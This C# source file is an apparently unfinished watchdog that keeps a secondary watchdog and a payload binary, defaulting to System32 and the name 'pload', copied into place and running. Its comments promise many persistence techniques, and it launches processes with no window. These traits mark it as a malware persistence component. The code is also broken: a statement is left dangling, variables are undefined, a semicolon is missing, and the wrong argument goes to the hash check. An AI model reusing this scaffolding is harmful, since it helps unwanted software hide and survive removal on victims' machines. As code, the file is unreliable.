using System;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;

/*
    This watch is constantly monitoring the secondary watchdog and the binary

Watchdog Functionality
    If either of the above watched binaries stop running or existing, this watchdog will copy and/or run them. Will not run anything that is currently running
    If the watched binaries stop existing in the current directory or in the destination directory, then 


Persistence functionality
    As long as this watchdog file is running, then everythign else is running in theory. So I set up a ton of persistence techniques to run this watchdog.
    Basically all of the persistence techniques will be iterated through, verified if they are set up correctly, then set up if not existing or set up correctly
*/


class Watchdog
{


    // Defaults to putting the file in the System32 directory and the binary name pload
     public static string BinaryPath { get; private set; }
    public static string BinaryName { get; private set; }
    public static string SecondaryWatchdogPath { get; private set; }
    public static string SecondaryWatchdogName { get; private set; }
    public static string SecondaryWatchdogMutexName { get; private set; }


    static void Main(string[] args)
    {
        string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName"};
        watchdogHelper.LoadFromJson("Config.json", staticVars)

        string mutexName = "Watchdog";

        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, mutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                    //Watchdog process is already running. Exiting.
                return;
            }

            string targetProcessName = "OtherProcessName";  // Do not include '.exe'
            if (Watchdog.IsProcessRunning(targetProcessName))
            {
                Console.WriteLine($"{targetProcessName} is already running. Proceeding with watchdog tasks.");
                
                // Place your watchdog logic here
                WatchdogLogic();
            }
            else
            {
                Console.WriteLine($"{targetProcessName} is not running. Exiting.");
            }
        }
    }

    static bool IsMutexRunning(string mutexName)
    {
        bool isNewInstance;
        
        // Attempt to create a mutex with the specified name
        using (Mutex mutex = new Mutex(false, mutexName, out isNewInstance))
        {
            // If a new instance was created, it means no other instance was running
            if (isNewInstance)
            {
                // Release the mutex so it's not held by this check
                mutex.ReleaseMutex();
                return false;
            }
            else
            {
                // If we couldn't create a new instance, another instance is already running
                return true;
            }
        }
    }

    static bool IsProcessRunning(string processName)
    {
        // Get a list of processes by name
        Process[] processes = Process.GetProcessesByName(processName);
        return processes.Length > 0;
    }


    static void WatchdogLogic()
    {
        // Example loop to simulate frequent checks
        while (true)
        {
            






            Console.WriteLine("Watchdog is monitoring...");
            Thread.Sleep(10000);  // Sleep for 1 second
        }
    }

    public static void CheckBinary(string destinationPath, string name)
    {
        string currentDirectory = Directory.GetCurrentDirectory();
        string sourcePath = Path.Combine(currentDirectory, name);
        string destPathBinary = Path.Combine(destinationPath, name);


        if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath, sourcePath)){
            return;
        } 
        else{
            CopyBinary(destPathBinary, sourcePath);
        }
    }

    public static void CopyBinary(string destPathBinary, string sourcePath){
        // Check if the .exe exists in the current directory
        if (File.Exists(sourcePath))
        {
            // Copy the .exe to the destination
            try
            {
                File.Copy(sourcePath, destPathBinary, overwrite: true);
                Console.WriteLine($"'{binaryName}' found and copied to {destPathBinary}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error copying file: {ex.Message}");
            }
        }
        else if(File.Exists(destPathBinary)){
            try
            {
                File.Copy(destPathBinary, sourcePath, overwrite: false);
                Console.WriteLine($"'{binaryName}' found and copied to {destPathBinary}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error copying file: {ex.Message}");
            }
        }
        else
        {
            Console.WriteLine($"'{binaryName}' not found in the current directory.");
        }
    }

    public static bool CompareFileHashes(string filePath1, string filePath2)
    {
        try
        {
            // Calculate the hash of each file
            byte[] hash1 = ComputeFileHash(filePath1);
            byte[] hash2 = ComputeFileHash(filePath2);

            // Compare the two hashes
            return StructuralComparisons.StructuralEqualityComparer.Equals(hash1, hash2);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error comparing files: {ex.Message}");
            return false;
        }
    }

    private static byte[] ComputeFileHash(string filePath)
    {
        using (FileStream stream = File.OpenRead(filePath))
        using (SHA256 sha256 = SHA256.Create())
        {
            return sha256.ComputeHash(stream);
        }
    }

    public static void runBinary(string binaryPath, string Mutex, string arguments = "")
    {
        try
        {
            // Initialize the process start information
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = binaryPath,
                Arguments = arguments,
                UseShellExecute = false,   // Set to true if you want to use the system shell
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true      // Set to false if you want a window to appear
            };

            // Start the process
            using (Process process = Process.Start(startInfo))
            {
                // Capture output if needed
                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();

                // Wait for the process to exit
                process.WaitForExit();

                // Output the results
                Console.WriteLine("Output:");
                Console.WriteLine(output);

                if (!string.IsNullOrEmpty(errors))
                {
                    Console.WriteLine("Errors:");
                    Console.WriteLine(errors);
                }

                Console.WriteLine("Process exited with code " + process.ExitCode);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to run binary: {ex.Message}");
        }
    }

    public static void runWatchdog(string binaryPath, string arguments = "")
    {
            RegistryHelper.
            if(!IsMutexRunning(secondaryWatchdogMutexName)){
                CheckBinary(secondaryWatchdogPath, secondaryWatchdogName);
            }
    }
}

